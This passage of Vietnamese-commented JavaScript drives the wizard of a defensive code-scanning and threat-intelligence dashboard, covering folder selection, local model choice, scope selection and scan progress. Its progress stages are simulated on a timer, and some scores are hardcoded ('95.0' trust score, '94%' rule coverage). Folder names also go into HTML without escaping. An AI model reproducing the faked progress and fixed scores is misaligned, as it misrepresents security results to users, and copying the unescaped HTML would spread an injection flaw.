        if (histSec) histSec.style.display = 'block';
        const defSec = document.getElementById('sec-defense');
        if (defSec) defSec.style.display = 'block';

        // Tu dong kich hoat cao bao va hien thi truc tiep tren giao dien Live Server
        startLiveServerCrawlStep5();
      } else if (stepNum === 6) {
        const hCount = document.getElementById("step6HistoryCount");
        const navH = document.getElementById("navHistoryCount");
        if (hCount && navH) hCount.textContent = navH.textContent;
      }

      const stepDescriptions = [
        "",
        "Bước 1: Quét cây cú pháp AST & Nhận diện điểm nhạy cảm mã nguồn.",
        "Bước 2: Chọn Mô hình AI thích ứng phần cứng máy tính.",
        "Bước 3: Chọn Phân hệ bảo vệ mối đe dọa (CTI Threat Scope).",
        "Bước 4: Thiết lập thời gian quét CTI & Mốc bài báo quá khứ.",
        "Bước 5: Cào báo CTI, Đối soát AST & Sinh gói kỹ năng tác tử.",
        "Bước 6: Vá mã nguồn, Khu vực xử lý, Lịch sử & Kiểm thử WAF."
      ];
      const st = document.getElementById("statusText");
      if (st && stepDescriptions[stepNum]) {
        st.textContent = stepDescriptions[stepNum];
      }
    }

    let wzSelectedScopes = ["SCOPE_WEB"];

    function syncScopeSelectorUI() {
      const checkboxes = document.getElementsByName("wzScopeCheckbox");
      if (!checkboxes || checkboxes.length === 0) return;

      checkboxes.forEach(cb => {
        const isSelected = wzSelectedScopes.includes(cb.value) || (wzScopeId === "SCOPE_ALL") || (cb.value === wzScopeId);
        cb.checked = isSelected;
        const card = document.getElementById("scopeCard_" + cb.value);
        if (card) {
          card.style.borderColor = isSelected ? "#2563eb" : "#cbd5e1";
          card.style.borderWidth = isSelected ? "2px" : "1px";
          card.style.background = isSelected ? "#eff6ff" : "#ffffff";
        }
        // Cap nhat badge DA CHON
        let badgeId = "";
        if (cb.value === "SCOPE_WEB") badgeId = "scopeWebSelectedBadge";
        else if (cb.value === "SCOPE_NETWORK") badgeId = "scopeNetSelectedBadge";
        else if (cb.value === "SCOPE_ENDPOINT") badgeId = "scopeEndSelectedBadge";
        else if (cb.value === "SCOPE_HARDWARE") badgeId = "scopeHwSelectedBadge";
        const bEl = document.getElementById(badgeId);
        if (bEl) bEl.style.display = isSelected ? "inline-block" : "none";
      });

      const allChk = document.getElementById("chkSelectAllScopes");
      if (allChk) {
        allChk.checked = (wzSelectedScopes.length >= checkboxes.length || wzScopeId === "SCOPE_ALL");
      }
    }

    function onWizardScopeCheckboxChange() {
      const checkboxes = document.getElementsByName("wzScopeCheckbox");
      const selected = [];
      checkboxes.forEach(cb => {
        const card = document.getElementById("scopeCard_" + cb.value);
        let badgeId = "";
        if (cb.value === "SCOPE_WEB") badgeId = "scopeWebSelectedBadge";
        else if (cb.value === "SCOPE_NETWORK") badgeId = "scopeNetSelectedBadge";
        else if (cb.value === "SCOPE_ENDPOINT") badgeId = "scopeEndSelectedBadge";
        else if (cb.value === "SCOPE_HARDWARE") badgeId = "scopeHwSelectedBadge";
        const bEl = document.getElementById(badgeId);

        if (cb.checked) {
          selected.push(cb.value);
          if (card) {
            card.style.borderColor = "#2563eb";
            card.style.borderWidth = "2px";
            card.style.background = "#eff6ff";
          }
          if (bEl) bEl.style.display = "inline-block";
        } else {
          if (card) {
            card.style.borderColor = "#cbd5e1";
            card.style.borderWidth = "1px";
            card.style.background = "#ffffff";
          }
          if (bEl) bEl.style.display = "none";
        }
      });

      // Neu bo tick het thi tu dong giu lai phan he dau tien
      if (selected.length === 0) {
        const first = checkboxes[0];
        if (first) {
          first.checked = true;
          selected.push(first.value);
          const card = document.getElementById("scopeCard_" + first.value);
          if (card) { card.style.borderColor = "#2563eb"; card.style.borderWidth = "2px"; card.style.background = "#eff6ff"; }
          const bEl = document.getElementById("scopeWebSelectedBadge");
          if (bEl) bEl.style.display = "inline-block";
        }
      }

      wzSelectedScopes = selected;
      const allChk = document.getElementById("chkSelectAllScopes");
      if (allChk) {
        allChk.checked = (selected.length === checkboxes.length);
      }

      if (selected.length === checkboxes.length) {
        wzScopeId = "SCOPE_ALL";
      } else if (selected.length === 1) {
        wzScopeId = selected[0];
      } else {
        wzScopeId = selected.join(",");
      }

      updateLiveTicker(`Đã chọn ${selected.length} phân hệ phòng thủ: ${selected.join(', ')}`);
    }

    function toggleSelectAllScopes(checked) {
      const checkboxes = document.getElementsByName("wzScopeCheckbox");
      checkboxes.forEach(cb => {
        cb.checked = checked;
      });
      onWizardScopeCheckboxChange();
    }

    async function wizardExecuteStep5Skill() {
      const btn = document.getElementById("btnNextStep5ToSkill");
      if (btn) {
        btn.disabled = true;
        btn.textContent = "[ ĐANG ĐÓNG GÓI KỸ NĂNG TÁC TỬ... ]";
      }
      try {
        const wzCadence = document.getElementById("wzCadenceSelect");
        const chosenCadence = wzCadence ? parseInt(wzCadence.value, 10) : (serverScanInterval || 21600);
        const res = await fetch("/api/wizard/synthesize", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({
            target: wzTarget,
            scope_id: wzScopeId,
            article_id: wzBestArticleId,
            scan_interval_sec: chosenCadence
          })
        });
        const d = await res.json();
        if (d.status === "success") {
          wzSkillName = d.skill_name;
          document.getElementById("wzSkillName").textContent = d.skill_name;
          document.getElementById("wzTrustScore").textContent = d.trust_score || "95.0";
          document.getElementById("wzSkillSection").style.display = "block";
          if (btn) {
            btn.style.display = "none";
          }
          // Bật timer quét ngầm trên StatusStrip vì dự án đã có cấu hình bảo vệ
          const autoScanControls = document.getElementById("autoScanStripControls");
          const autoScanMsg = document.getElementById("autoScanPendingMsg");
          if (autoScanControls) autoScanControls.style.display = "flex";
          if (autoScanMsg) autoScanMsg.style.display = "none";
        }
      } catch (e) {
        alert("Lỗi đóng gói: " + e);
        if (btn) {
          btn.disabled = false;
          btn.textContent = "[ SINH GÓI KỸ NĂNG TÁC TỬ (SKILL.MD) -> ]";
        }
      }
    }

    function setWizardTarget(path) {
      const inp = document.getElementById("wizardInputTarget");
      if (inp) {
        inp.value = path;
        validateTargetFolder(path);
      }
    }

    let modalCurrentBrowsedPath = "";
    let modalParentBrowsedPath = "";

    function openDirectoryBrowserModal() {
      const currentVal = document.getElementById("wizardInputTarget") ? document.getElementById("wizardInputTarget").value.trim() : "";
      const modal = document.getElementById("dirPickerModal");
      if (modal) {
        modal.style.display = "flex";
        loadDirInModal(currentVal || "./target_projects");
      }
    }

    function closeDirectoryBrowserModal() {
      const modal = document.getElementById("dirPickerModal");
      if (modal) modal.style.display = "none";
    }

    async function loadDirInModal(targetPath) {
      const listEl = document.getElementById("modalFolderList");
      const inpEl = document.getElementById("modalCurrentPathInp");
      const drivesEl = document.getElementById("modalDrivesContainer");
      const parentBtn = document.getElementById("modalParentBtn");
      
      if (listEl) listEl.innerHTML = `<div style="color:#64748b; font-size:13px; text-align:center; padding:20px;">Đang đọc danh sách thư mục...</div>`;

      try {
        const res = await fetch(`/api/system/list-dir?path=${encodeURIComponent(targetPath || '')}`);
        const data = await res.json();
        if (data.status === "success") {
          modalCurrentBrowsedPath = data.current_path;
          modalParentBrowsedPath = data.parent_path;
          if (inpEl) inpEl.value = data.current_path;

          if (parentBtn) {
            parentBtn.disabled = !data.parent_path;
          }

          // Render drives
          if (drivesEl && data.drives) {
            drivesEl.innerHTML = data.drives.map(d => `
              <button type="button" class="CleanBtn" style="font-size:11px; padding:3px 8px; font-weight:700; background:#f8fafc;" onclick="loadDirInModal('${d}')">
                Ổ ${d}
              </button>
            `).join('');
          }

          // Render folder list
          if (listEl) {
            if (!data.folders || data.folders.length === 0) {
              listEl.innerHTML = `
                <div style="padding:25px; text-align:center; color:#64748b; font-size:13px;">
                  Không có thư mục con nào. Bạn có thể nhấn <b>[ CHỌN THƯ MỤC NÀY ]</b> để bảo vệ thư mục hiện tại.
                </div>
              `;
            } else {
              listEl.innerHTML = `
                <div style="display:grid; grid-template-columns:repeat(auto-fill, minmax(200px, 1fr)); gap:8px;">
                  ${data.folders.map(f => `
                    <div style="padding:10px 12px; border:1px solid #e2e8f0; border-radius:6px; cursor:pointer; display:flex; align-items:center; gap:8px; font-size:12.5px; background:#f8fafc; transition:all 0.15s;" 
                         onmouseover="this.style.background='#eff6ff'; this.style.borderColor='#3b82f6';" 
                         onmouseout="this.style.background='#f8fafc'; this.style.borderColor='#e2e8f0';"
                         ondblclick="loadDirInModal('${data.current_path}/${f}')"
                         onclick="selectModalFolderItem('${data.current_path}/${f}', this)">
                      <span style="font-weight:700; color:#2563eb;">[THƯ MỤC]</span>
                      <span style="font-weight:600; color:#1e293b; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${f}</span>
                    </div>
                  `).join('')}
                </div>
              `;
            }
          }
        }
      } catch (e) {
        if (listEl) listEl.innerHTML = `<div style="color:#ef4444; padding:20px; text-align:center;">Lỗi đọc thư mục: ${e.message}</div>`;
      }
    }

    function selectModalFolderItem(path, el) {
      modalCurrentBrowsedPath = path;
      const inpEl = document.getElementById("modalCurrentPathInp");
      if (inpEl) inpEl.value = path;
      document.querySelectorAll("#modalFolderList > div > div").forEach(d => {
        d.style.borderColor = "#e2e8f0";
        d.style.background = "#f8fafc";
      });
      if (el) {
        el.style.borderColor = "#2563eb";
        el.style.background = "#dbeafe";
      }
    }

    function navigateModalParent() {
      if (modalParentBrowsedPath) {
        loadDirInModal(modalParentBrowsedPath);
      }
    }

    function confirmSelectedModalDir() {
      const path = modalCurrentBrowsedPath || (document.getElementById("modalCurrentPathInp") ? document.getElementById("modalCurrentPathInp").value.trim() : "");
      if (path) {
        const inp = document.getElementById("wizardInputTarget");
        if (inp) {
          inp.value = path;
          validateTargetFolder(path);
        }
      }
      closeDirectoryBrowserModal();
    }

    function triggerHtml5PickerInsideModal() {
      const picker = document.getElementById("wizardHtml5DirPicker");
      if (picker) {
        closeDirectoryBrowserModal();
        picker.click();
      }
    }

    async function triggerBrowseNativeFolder() {
      const btn = document.getElementById("btnBrowseNativeFolder");
      const oldTxt = btn ? btn.textContent : '';
      if (btn) {
        btn.disabled = true;
        btn.textContent = "Đang mở File Explorer...";
      }
      try {
        const currentVal = document.getElementById("wizardInputTarget") ? document.getElementById("wizardInputTarget").value.trim() : "";
        const res = await fetch(`/api/system/browse-folder?initial=${encodeURIComponent(currentVal)}`);
        const data = await res.json();
        if (data.status === "success" && data.path) {
          const inp = document.getElementById("wizardInputTarget");
          if (inp) {
            inp.value = data.path;
            validateTargetFolder(data.path);
          }
        }
      } catch (e) {
        console.error("Lỗi duyệt File Explorer:", e);
      } finally {
        if (btn) {
          btn.disabled = false;
          btn.textContent = oldTxt || "Duyệt File Explorer Máy Tính...";
        }
      }
    }

    function handleHtml5DirPicked(event) {
      const files = event.target.files;
      if (files && files.length > 0) {
        const firstRel = files[0].webkitRelativePath;
        const rootFolder = firstRel.split('/')[0];
        const valText = document.getElementById("folderValText");
        const valBadge = document.getElementById("folderValBadge");
        if (valText) {
          valText.innerHTML = `<span style="font-weight:600; color:#2563eb;">Đã chọn qua trình duyệt:</span> <b>${rootFolder}</b> (${files.length} tệp tin)`;
        }
        if (valBadge) {
          valBadge.innerHTML = `<span style="background:#dcfce7; color:#15803d; font-weight:700; padding:3px 10px; border-radius:12px; font-size:11px;">[OK] ĐÃ NẠP ${files.length} TỆP</span>`;
        }
        const inp = document.getElementById("wizardInputTarget");
        if (inp && (inp.value === "./target_projects/My_Website" || !inp.value)) {
          inp.value = `./target_projects/${rootFolder}`;
        }
      }
    }

    let validateDebounceTimer = null;
    function debounceValidateFolder() {
      clearTimeout(validateDebounceTimer);
      validateDebounceTimer = setTimeout(() => {
        const path = document.getElementById("wizardInputTarget").value.trim();
        validateTargetFolder(path);
      }, 350);
    }

    async function validateTargetFolder(path) {
      if (!path) return;
      try {
        const res = await fetch('/api/system/validate-folder', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({path: path})
        });
        const d = await res.json();
        const valText = document.getElementById("folderValText");
        const valBadge = document.getElementById("folderValBadge");
        if (d.exists) {
          const techsStr = (d.detected_techs && d.detected_techs.length > 0) ? ` &bull; Ngăn xếp: <b style="color:#0284c7;">${d.detected_techs.join(', ')}</b>` : '';
          if (valText) valText.innerHTML = `<span style="font-weight:600; color:#15803d;">Đã xác thực:</span> <span class="mono">${d.path}</span> (${d.file_count} tệp tin${techsStr})`;
          if (valBadge) valBadge.innerHTML = `<span style="background:#dcfce7; color:#15803d; font-weight:700; padding:3px 10px; border-radius:12px; font-size:11px;">[OK] HỢP LỆ (${d.file_count} TỆP)</span>`;
        } else {
          if (valText) valText.innerHTML = `<span style="font-weight:600; color:#dc2626;">[CANH BAO] Chưa tìm thấy:</span> <span class="mono">${path}</span>`;
          if (valBadge) valBadge.innerHTML = `<span style="background:#fee2e2; color:#b91c1c; font-weight:700; padding:3px 10px; border-radius:12px; font-size:11px;">[LOI] CHƯA TỒN TẠI</span>`;
        }
      } catch (e) {
        console.warn("Folder validation error:", e);
      }
    }

    function setWizardDemo(type) {
      const inpTarget = document.getElementById("wizardInputTarget");
      const inpClone = document.getElementById("wizardInputClone");
      if (type === 'php') {
        inpTarget.value = "./target_projects/demo_vulnerable_php_app";
        inpClone.value = "";
      } else if (type === 'docker') {
        inpTarget.value = "./target_projects/My_Website";
        inpClone.value = "";
      }
    }

    function renderHardwareModelSelector(currentActiveModel) {
      const container = document.getElementById("wzModelTiersContainer");
      const summaryTag = document.getElementById("wzHardwareSummaryTag");
      if (!container || !detectedSystemModelData) return;

      const hw = detectedSystemModelData.hardware || {};
      if (summaryTag) {
        summaryTag.textContent = `${hw.gpu_name || 'GPU'} • ${hw.vram_gb || 0}GB VRAM • ${hw.ram_gb || 16}GB RAM`;
      }

      const tiers = detectedSystemModelData.model_tiers || [];
      let activeVal = currentActiveModel;
      if (!activeVal) {
        try { activeVal = localStorage.getItem('selectedAiModel'); } catch(e){}
      }
      if (!activeVal) {
        activeVal = detectedSystemModelData.active_model || 'qwen2.5:7b';
      }

      let html = "";
      tiers.forEach((t) => {
        const isTier1 = (t.tier_key === 'STRONGEST');
        const borderColor = isTier1 ? '#3b82f6' : (t.tier_key === 'BALANCED' ? '#10b981' : '#64748b');
        const bgHeader = isTier1 ? '#eff6ff' : (t.tier_key === 'BALANCED' ? '#f0fdf4' : '#f8fafc');
        const colorTitle = isTier1 ? '#1d4ed8' : (t.tier_key === 'BALANCED' ? '#047857' : '#334155');

        html += `
          <div style="background:#ffffff; border:1.5px solid ${borderColor}; border-radius:8px; overflow:hidden; margin-bottom:12px; box-shadow:0 1px 3px rgba(0,0,0,0.05);">
            <div style="background:${bgHeader}; padding:10px 16px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #e2e8f0; flex-wrap:wrap; gap:8px;">
              <div>
                <b style="color:${colorTitle}; font-size:13px;">${t.tier_title}</b>
              </div>
              <span style="font-size:11px; font-weight:700; color:${colorTitle}; background:#ffffff; border:1px solid ${borderColor}; padding:2px 10px; border-radius:12px;">
                ${t.tier_badge}
              </span>
            </div>
            <div style="padding:12px 16px; display:flex; flex-direction:column; gap:10px;">
        `;

        (t.models || []).forEach(m => {
          const isChecked = (m.id === activeVal);
          const readyBadge = m.is_installed
            ? `<span style="background:#dcfce7; color:#15803d; font-weight:700; font-size:10.5px; padding:2px 8px; border-radius:4px;">ĐÃ SẴN SÀNG</span>`
            : `<span style="background:#fef3c7; color:#b45309; font-weight:600; font-size:10.5px; padding:2px 8px; border-radius:4px;">CẦN TẢI (ollama pull ${m.id})</span>`;

          const isHeuristic = (m.id === 'cti-heuristic-engine' || m.is_heuristic);
          const intelScore = m.intelligence !== undefined ? m.intelligence : (isTier1 ? 68 : 56);
          const speedScore = m.speed_tps !== undefined ? m.speed_tps : (isTier1 ? 28 : 48);
          const vramScore = m.vram_gb !== undefined ? m.vram_gb : (isTier1 ? 5.8 : 3.6);

          let benchmarkGridHtml = "";
          if (isHeuristic) {
            benchmarkGridHtml = `
              <!-- BẢNG THÔNG SỐ ĐỘNG CƠ PHÂN TÍCH TĨNH (NON-LLM HEURISTIC) -->
              <div style="margin-left:27px; display:grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap:12px; background:#f8fafc; border:1px solid #e2e8f0; border-radius:6px; padding:10px 14px;">
                <div>
                  <div style="display:flex; justify-content:space-between; font-size:11.5px; margin-bottom:4px;">
                    <span style="color:#475569; font-weight:600;">Độ Phủ Quy Tắc AST:</span>
                    <b style="color:#2563eb;">94% (OWASP/CWE)</b>
                  </div>
                  <div style="background:#cbd5e1; border-radius:4px; height:7px; overflow:hidden;">
                    <div style="background:linear-gradient(90deg, #3b82f6, #2563eb); width:94%; height:100%;"></div>
                  </div>
                </div>
                <div>
                  <div style="display:flex; justify-content:space-between; font-size:11.5px; margin-bottom:4px;">
                    <span style="color:#475569; font-weight:600;">Độ Trễ Phản Hồi:</span>
                    <b style="color:#10b981;">&lt; 2 ms (Tức thì)</b>
                  </div>
                  <div style="background:#cbd5e1; border-radius:4px; height:7px; overflow:hidden;">
                    <div style="background:linear-gradient(90deg, #34d399, #059669); width:100%; height:100%;"></div>
                  </div>
                </div>
                <div>
                  <div style="display:flex; justify-content:space-between; font-size:11.5px; margin-bottom:4px;">
                    <span style="color:#475569; font-weight:600;">Tài Nguyên Sử Dụng:</span>
                    <b style="color:#7c3aed;">0% GPU • 15 MB RAM</b>
                  </div>
                  <div style="background:#cbd5e1; border-radius:4px; height:7px; overflow:hidden;">
                    <div style="background:linear-gradient(90deg, #a78bfa, #7c3aed); width:5%; height:100%;"></div>
                  </div>
                </div>
              </div>
            `;
          } else {
            // Dành cho LLM chuẩn Artificial Analysis
            benchmarkGridHtml = `
              <!-- BẢNG ĐIỂM BENCHMARK TRỰC QUAN (CHUẨN ARTIFICIAL ANALYSIS & PHẦN CỨNG THỰC TẾ) -->
              <div style="margin-left:27px; display:grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap:12px; background:#f8fafc; border:1px solid #e2e8f0; border-radius:6px; padding:10px 14px;">
                <!-- Metric 1: Intelligence Index (Thang chuẩn Artificial Analysis 0-100) -->
                <div>
                  <div style="display:flex; justify-content:space-between; font-size:11.5px; margin-bottom:4px;">
                    <span style="color:#475569; font-weight:600;">Chỉ Số Trí Tuệ (Artificial Analysis):</span>
                    <b style="color:#2563eb;">${intelScore}/100</b>
                  </div>
                  <div style="background:#cbd5e1; border-radius:4px; height:7px; overflow:hidden;">
                    <div style="background:linear-gradient(90deg, #3b82f6, #2563eb); width:${intelScore}%; height:100%;"></div>
                  </div>
                </div>

                <!-- Metric 2: Speed (tokens/s thực tế trên băng thông bộ nhớ máy) -->
                <div>
                  <div style="display:flex; justify-content:space-between; font-size:11.5px; margin-bottom:4px;">
                    <span style="color:#475569; font-weight:600;">Tốc Độ Suy Luận Thực Tế:</span>
                    <b style="color:#10b981;">${speedScore} t/s</b>
                  </div>
                  <div style="background:#cbd5e1; border-radius:4px; height:7px; overflow:hidden;">
                    <div style="background:linear-gradient(90deg, #34d399, #059669); width:${Math.min(100, Math.round((speedScore / 60) * 100))}%; height:100%;"></div>
                  </div>
                </div>

                <!-- Metric 3: Resource Requirement (VRAM weights + KV Cache) -->
                <div>
                  <div style="display:flex; justify-content:space-between; font-size:11.5px; margin-bottom:4px;">
                    <span style="color:#475569; font-weight:600;">Chiếm Dụng Bộ Nhớ:</span>
                    <b style="color:#7c3aed;">${vramScore > 0 ? vramScore + ' GB VRAM' : '1.5 GB RAM (CPU Mode)'}</b>
                  </div>
                  <div style="background:#cbd5e1; border-radius:4px; height:7px; overflow:hidden;">
                    <div style="background:linear-gradient(90deg, #a78bfa, #7c3aed); width:${vramScore > 0 ? Math.min(100, Math.round((vramScore / 8) * 100)) : 18}%; height:100%;"></div>
                  </div>
                </div>
              </div>
            `;
          }

          html += `
            <label style="display:block; cursor:pointer; padding:12px 16px; border-radius:8px; background:${isChecked ? '#f0f9ff' : '#ffffff'}; border:2px solid ${isChecked ? '#2563eb' : '#e2e8f0'}; transition:all 0.2s;" onmouseover="if(!this.querySelector('input').checked) this.style.borderColor='#93c5fd'" onmouseout="if(!this.querySelector('input').checked) this.style.borderColor='#e2e8f0'">
              <div style="display:flex; justify-content:space-between; align-items:flex-start; flex-wrap:wrap; gap:8px;">
                <div style="display:flex; align-items:center; gap:10px;">
                  <input type="radio" name="wzModelRadio" value="${m.id}" ${isChecked ? 'checked' : ''} onchange="onWizardModelRadioChange('${m.id}')" style="width:17px; height:17px; cursor:pointer; accent-color:#2563eb;" />
                  <div>
                    <b style="color:#0f172a; font-size:14px;">${m.name}</b>
                    <span style="font-family:monospace; font-size:11.5px; color:#64748b; margin-left:6px;">(${m.id})</span>
                  </div>
                </div>
                <div style="display:flex; gap:6px; align-items:center;">
                  ${readyBadge}
                  ${m.badge ? `<span style="background:#dbeafe; color:#1e40af; font-size:10.5px; font-weight:700; padding:2px 8px; border-radius:4px;">${m.badge}</span>` : ''}
                </div>
              </div>

              <div style="font-size:12.5px; color:#475569; margin:8px 0 10px 27px; line-height:1.4;">
                ${m.desc}
              </div>

              ${benchmarkGridHtml}
            </label>
          `;
        });

        html += `
            </div>
          </div>
        `;
      });

      container.innerHTML = html;
    }

    function renderAdaptiveCadence(scopeId) {
      if (!detectedSystemModelData || !detectedSystemModelData.cadence_recommendations) return;
      const adviceBox = document.getElementById("wzCadenceAdviceBox");
      const sel = document.getElementById("wzCadenceSelect");
      const primaryScope = (scopeId && scopeId.includes(",")) ? scopeId.split(",")[0] : (scopeId || "SCOPE_WEB");
      const isAll = (scopeId === "SCOPE_ALL" || (wzSelectedScopes && wzSelectedScopes.length >= 4));
      const isMulti = (scopeId && scopeId.includes(","));

      let rec = detectedSystemModelData.cadence_recommendations[primaryScope] || detectedSystemModelData.cadence_recommendations["SCOPE_WEB"];

      if (adviceBox) {
        if (isAll) {
          adviceBox.innerHTML = `
            Tác tử AI nhận diện: Bạn đang kích hoạt chế độ <b style="color:#7e22ce;">TOÀN DIỆN: TẤT CẢ CÁC PHÂN HỆ</b> (Web + Mạng + Máy Chủ + Phần Cứng).
            <br/>&rarr; Tần suất khuyến nghị đồng bộ: <b style="color:#1e40af;">Mỗi 6 giờ (21,600s)</b> nhằm kiểm soát toàn diện mọi bề mặt tấn công.
          `;
        } else if (isMulti) {
          adviceBox.innerHTML = `
            Tác tử AI nhận diện: Bạn đã chọn <b style="color:#2563eb;">${wzSelectedScopes.length} phân hệ an ninh tích hợp</b> (${wzSelectedScopes.join(', ')}).
            <br/>&rarr; Tần suất tối ưu theo phân hệ nhạy cảm nhất: <b style="color:#1e40af;">${rec.default_label}</b>.
          `;
        } else if (rec) {
          adviceBox.innerHTML = `
            Tác tử AI nhận diện: Dự án thuộc phân hệ <b>${rec.scope_name}</b> (${rec.desc})
            <br/>&rarr; Tần suất tự động quét ngầm tối ưu: <b style="color:#1e40af;">${rec.default_label}</b>.
          `;
        }
      }

      if (sel && rec && rec.options) {
        const defSec = rec.default_interval_sec || 21600;
        sel.innerHTML = "";
        rec.options.forEach(opt => {
          const optEl = document.createElement("option");
          optEl.value = String(opt.sec);
          optEl.textContent = opt.label;
          if (opt.sec === defSec || opt.is_default) {
            optEl.selected = true;
          }
          sel.appendChild(optEl);
        });
        sel.value = String(defSec);
        const selMain = document.getElementById('scanDelayInput');
        if (selMain) selMain.value = String(defSec);
        onWizardCadenceChange(String(defSec));
      }

      // Đặt mặc định số năm cào báo quá khứ theo thể loại
      if (rec && rec.default_history_years) {
        const rads = document.getElementsByName("wzHistory");
        rads.forEach(r => {
          if (parseInt(r.value, 10) === rec.default_history_years) {
            r.checked = true;
          }
        });
      }
    }

    
    function wizardConfirmStep2ModelAndProceed() {
      // Tìm model đang được chọn trong radio
      const checkedRadio = document.querySelector('input[name="wzModelRadio"]:checked');
      let chosenModel = checkedRadio ? checkedRadio.value : 'qwen3:8b';
      
      try {
        localStorage.setItem('selectedAiModel', chosenModel);
      } catch (e) {}

      // Xóa option pending trên Navbar nếu có và cập nhật model đã chọn
      const sel = document.getElementById('aiModelSelect');
      if (sel) {
        const pendingOpt = sel.querySelector('option[value="pending"]');
        if (pendingOpt) pendingOpt.remove();
        sel.value = chosenModel;
      }

      // Cập nhật thanh ticker
      updateModelBadgeText(chosenModel);
      updateLiveTicker(`Đã xác nhận mô hình phòng thủ: ${chosenModel} (${detectedSystemHardware ? detectedSystemHardware.gpu_name : 'GPU Cục Bộ'})`);

      // Chuyển tiếp sang Bước 3
      wizardGotoStep(3);
    }

    function onWizardModelRadioChange(modelId) {
      try { localStorage.setItem('selectedAiModel', modelId); } catch(e){}
      const sel = document.getElementById('aiModelSelect');
      if (sel) sel.value = modelId;
      updateModelBadgeText(modelId);
      updateLiveTicker(`Đã chọn mô hình: ${modelId} (${detectedSystemHardware ? detectedSystemHardware.gpu_name : 'GPU Cục Bộ'})`);
      renderHardwareModelSelector(modelId);
    }

    async function onWizardCadenceChange(val) {
      const sec = parseInt(val, 10);
      serverScanInterval = sec;
      const selMain = document.getElementById('scanDelayInput');
      if (selMain && selMain.value !== String(sec)) selMain.value = String(sec);
      const wzSel = document.getElementById('wzCadenceSelect');
      if (wzSel && wzSel.value !== String(sec)) wzSel.value = String(sec);
      try {
        await fetch('/api/system/daemon-config', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ scan_interval_sec: sec }),
        });
      } catch (e) {}
    }

    async function wizardExecuteStep1() {
      const targetVal = document.getElementById("wizardInputTarget").value.trim();
      const cloneVal = document.getElementById("wizardInputClone").value.trim();
      const btn = document.getElementById("btnRunStep1");
      const nextBtn = document.getElementById("btnNextFromStep1");
      const term = document.getElementById("wzScanAgentTerminal");
      const resSummary = document.getElementById("wzScanResultSummary");
      const progWrap = document.getElementById("wzScanProgressWrap");
      const progBar = document.getElementById("wzProgressBarFill");
      const progText = document.getElementById("wzProgressPercent");
      const progStage = document.getElementById("wzProgressStageText");
      const progDetail = document.getElementById("wzProgressDetail");
      const progEta = document.getElementById("wzProgressEta");
      const progSpinner = document.getElementById("wzProgressSpinner");

      if (nextBtn) {
        nextBtn.disabled = true;
        nextBtn.dataset.enabled = "false";
        nextBtn.style.background = "#94a3b8";
        nextBtn.style.cursor = "not-allowed";
        nextBtn.style.opacity = "0.5";
        nextBtn.style.boxShadow = "none";
      }
      
      if (btn) {
        btn.disabled = true;
        btn.textContent = "[ AGENT ĐANG PHÂN TÍCH MÃ NGUỒN... ]";
        btn.style.background = "#64748b";
      }

      // Kích hoạt thanh tiến trình và terminal
      if (progWrap) progWrap.style.display = "block";
      if (progBar) {
        progBar.style.width = "4%";
        progBar.style.background = "linear-gradient(90deg, #3b82f6, #2563eb, #1d4ed8)";
      }
      if (progText) progText.textContent = "4%";
      if (progStage) progStage.textContent = "[1/4] Duyệt cây thư mục & lập chỉ mục cú pháp AST...";
      if (progDetail) progDetail.textContent = "Tác tử AI đang đọc các tệp mã nguồn và tệp cấu hình...";
      if (progEta) progEta.textContent = "Ước tính: ~15s";
      if (progSpinner) progSpinner.style.display = "inline-block";

      if (term) {
        term.style.display = "block";
        term.innerHTML = `<div style="color:#94a3b8;">[KHỞI TẠO] Tác tử AI Codebase Inspector đang đọc cây AST và các tệp cấu hình...</div>`;
      }

      // Vòng lặp mô phỏng tiến độ mượt mà trong lúc chờ Local LLM GPU suy luận
      let currentPercent = 4;
      let elapsedSec = 0;
      const progressTimer = setInterval(() => {
        elapsedSec += 0.3;
        if (currentPercent < 90) {
          currentPercent += (currentPercent < 40 ? 4 : (currentPercent < 75 ? 2.5 : 1));
          if (currentPercent > 92) currentPercent = 92;
          const rounded = Math.round(currentPercent);
          if (progBar) progBar.style.width = rounded + "%";
          if (progText) progText.textContent = rounded + "%";

          if (rounded >= 20 && rounded < 45) {
            if (progStage) progStage.textContent = "[2/4] Bóc tách điểm nóng nhạy cảm (Sinks: upload.php, shell_exec, eval)...";
            if (progDetail) progDetail.textContent = "Đang kiểm tra các hàm thực thi hệ thống và điểm tải tệp...";
          } else if (rounded >= 45 && rounded < 75) {
            if (progStage) progStage.textContent = "[3/4] Nạp ngữ cảnh vào Local LLM Qwen3:8B (GPU RX 6600) suy luận rủi ro...";
            if (progDetail) progDetail.textContent = "Mô hình khang-qwen3:latest đang đọc hiểu và phân tích bề mặt tấn công...";
            if (progEta) progEta.textContent = `Đang suy luận: ${Math.round(elapsedSec)}s`;
          } else if (rounded >= 75) {
            if (progStage) progStage.textContent = "[4/4] Tác tử AI đang tổng hợp luận điểm định danh & gán phân hệ Scope...";
            if (progDetail) progDetail.textContent = "Tổng hợp kết quả thẩm định kiến trúc và đề xuất đối sách...";
          }
        }
      }, 300);

      try {
        const res = await fetch("/api/wizard/scan", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ target: targetVal, clone_url: cloneVal })
        });
        clearInterval(progressTimer);

        // Đạt 100% hoàn thành
        if (progBar) {
          progBar.style.width = "100%";
          progBar.style.background = "linear-gradient(90deg, #10b981, #059669)";
        }
        if (progText) {
          progText.textContent = "100%";
          progText.style.color = "#059669";
        }
        if (progStage) progStage.textContent = "[HOÀN THÀNH] Tác tử AI đã thẩm định xong toàn diện dự án!";
        if (progDetail) progDetail.textContent = "Đã xác định kiến trúc, điểm nóng và gán phân hệ phòng thủ tối ưu.";
        if (progEta) progEta.textContent = `Xong trong: ${Math.round(elapsedSec)}s`;
        if (progSpinner) progSpinner.style.display = "none";
        const d = await res.json();
        if (d.status === "success") {
          wzTarget = d.target_path;
          wzScopeId = d.scope_id;
          wzSelectedScopes = [d.scope_id || "SCOPE_WEB"];
          syncScopeSelectorUI();
          const elTarget = document.getElementById("wzTargetName");
          if (elTarget) elTarget.textContent = d.target_name + " (" + d.target_path + ")";
          const elS1 = document.getElementById("step1TargetName");
